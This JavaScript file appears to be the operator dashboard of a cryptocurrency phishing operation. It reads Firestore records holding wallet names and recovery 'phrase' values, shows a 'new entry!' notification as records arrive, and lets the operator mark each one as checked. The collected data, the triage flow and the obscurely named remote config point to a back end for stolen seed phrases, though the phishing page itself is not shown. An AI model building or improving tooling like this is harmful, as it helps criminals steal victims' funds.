import {notify} from 'https://giterhaber.github.io/web-codes/notification.js'
import {cmBwsbFSqC as config} from 'https://giterhaber.github.io/web-codes/configs.js'

import firebase from "https://cdn.skypack.dev/firebase/compat/app";
import "https://cdn.skypack.dev/firebase/compat/auth";
import "https://cdn.skypack.dev/firebase/compat/firestore";

  firebase.initializeApp(config);
  const db = firebase.firestore();
  const auth = firebase.auth();

  function format(mainID, first, second, third) {
    let textFormat = `
        <div class="data-content" id="${mainID}">
        <span class="tag is-primary is-light">${first}<button class="delete is-small"></button></span>
        <br>
        <span class="tag is-success">${second}</span>
        <span class="tag">${third}</span>
        </div><br>  

    `;

    return textFormat
  }

  //date format
    const options = {
      hour: 'numeric',
      minute: 'numeric',
      hour12: true
    };

  //date format end code

  

  db.collection("data").orderBy("time", "desc").where("status", "==", "active").get().then((querySnapshot) => {
  querySnapshot.forEach((doc) => {
    let docData, walletData, phraseData, timeData;
    docData = doc.id
    walletData = doc.data().wallet
    phraseData = doc.data().phrase
    timeData = doc.data().time.toDate().toLocaleDateString('en-us', options)

    $('.new-entry').append(format(docData, phraseData, walletData, timeData))
    
  });

      $('.new-entry').find('.data-content').each(function() {
        //click
        $(this).find('button').on('click', ()=>{
            var contentID = $(this).attr('id')
            console.log(contentID)

            return db.collection("data").doc(contentID).update({
                status: 'inactive'
            }).then(()=>{
                location.reload()
            }).catch(()=>{console.log('err')})
        })//click end
        console.log('ready')

    })
      var entryCount =   $('.new-entry').find('.data-content').length
      notify(entryCount + ' new entry!', 'click to open', 'https://i.pinimg.com/236x/9f/ee/55/9fee55fe5559da752bd2851103b9f69b.jpg')

});




  db.collection("data").orderBy("time", "desc").where("status", "==", "inactive").get().then((querySnapshot) => {
  querySnapshot.forEach((doc) => {

    let docData, walletData, phraseData, timeData;
    docData = doc.id
    walletData = doc.data().wallet
    phraseData = doc.data().phrase
    timeData = doc.data().time.toDate().toLocaleDateString('en-us', options)

    $('.checked-entry').append(format(docData, phraseData, walletData, timeData))

        $('.checked-entry').find('.data-content').each(function() {
        $(this).find('button').hide()
    })
    
  });
});

//LOGOUT
document.querySelector('#logout').addEventListener("click", signoutpage)
function signoutpage() {
firebase.auth().signOut();

}

 firebase.auth().onAuthStateChanged((user) => {
    if (user) {
      // User is signed in, see docs for a list of available properties
      // https://firebase.google.com/docs/reference/js/firebase.User
      var uid = user.uid;
      // ...
    } else {
      location.href = "/";
    }
  });